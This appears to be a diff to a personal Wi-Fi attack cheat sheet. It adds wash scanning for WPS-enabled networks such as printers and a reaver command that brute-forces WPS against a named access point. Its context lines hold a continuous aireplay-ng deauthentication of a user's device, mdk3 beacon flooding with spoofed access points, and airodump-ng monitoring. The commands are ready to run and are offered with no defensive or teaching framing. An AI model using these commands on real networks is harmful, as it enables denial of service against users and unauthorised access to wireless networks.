@@ -71,9 +71,12 @@ sudo mdk3 wlan0 b -c 1 -f ./data/data.lst ## update data.txt with spooffed ap
 airodump-ng wlan0 -c 11 ## use to monitor local APS 
 
 -----------------------------------------------------[DEAUTH USERS]---------------------------------------------
-
+[Scan for networks using the monitor mode interface-- such as printers]
+sudo wash -i wlan2 -c 6 
+[Use the monitor mode interface (-i mon0) to attack the access point (-b E0:3F:49:6A:57:78), displaying verbose output (-v)]
+reaver -i wlan0mon -b E0:3F:49:6A:57:78 -v
+[Use the aireplay to deauth users] 
 aireplay-ng --deauth 0 -c [DEVICES MAC ADDRESS] -a [ROUTERS MAC ADDRESS] wlan0mon
-
 
 -----------------------------------------------------[WHOS CONNECTINIG TO ME]---------------------------------------------
 [netscanner]
